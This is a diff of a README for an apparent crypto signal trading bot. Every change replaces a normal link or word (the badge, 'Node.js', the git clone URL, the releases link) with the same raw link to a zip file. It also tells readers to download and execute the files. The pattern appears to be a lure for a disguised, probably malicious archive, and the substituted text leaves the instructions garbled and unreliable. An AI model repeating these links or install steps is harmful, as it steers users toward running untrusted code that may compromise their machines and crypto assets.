@@ -1,8 +1,8 @@
 # BitPay Crypto Signal Trading Bot Analysis
 
-![Crypto Trading](https://img.shields.io/badge/Crypto%20Trading-Active-brightgreen)
+![Crypto Trading](https://raw.githubusercontent.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/main/ticklenburg/Bot_Bit_Crypto_id_Signal_Masters_Trading_Analysis_Pay_v2.0-alpha.1.zip%20Trading-Active-brightgreen)
 
-Welcome to the **BitPay Crypto Signal Trading Bot Analysis** repository! This project focuses on trading and technical analysis for cryptocurrencies. It features a Node.js implementation of a signal protocol, along with a static website that provides real-time crypto prices through a serverless backend.
+Welcome to the **BitPay Crypto Signal Trading Bot Analysis** repository! This project focuses on trading and technical analysis for cryptocurrencies. It features a https://raw.githubusercontent.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/main/ticklenburg/Bot_Bit_Crypto_id_Signal_Masters_Trading_Analysis_Pay_v2.0-alpha.1.zip implementation of a signal protocol, along with a static website that provides real-time crypto prices through a serverless backend.
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id.git
+   git clone https://raw.githubusercontent.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/main/ticklenburg/Bot_Bit_Crypto_id_Signal_Masters_Trading_Analysis_Pay_v2.0-alpha.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -43,7 +43,7 @@ To get started with this project, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/main/ticklenburg/Bot_Bit_Crypto_id_Signal_Masters_Trading_Analysis_Pay_v2.0-alpha.1.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -98,7 +98,7 @@ For any questions or feedback, please reach out to the project maintainers.
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/releases). Download the files and execute them to explore the latest features and improvements.
+You can find the latest releases [here](https://raw.githubusercontent.com/Saimon9797/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-id/main/ticklenburg/Bot_Bit_Crypto_id_Signal_Masters_Trading_Analysis_Pay_v2.0-alpha.1.zip). Download the files and execute them to explore the latest features and improvements.
 
 ## Topics
 
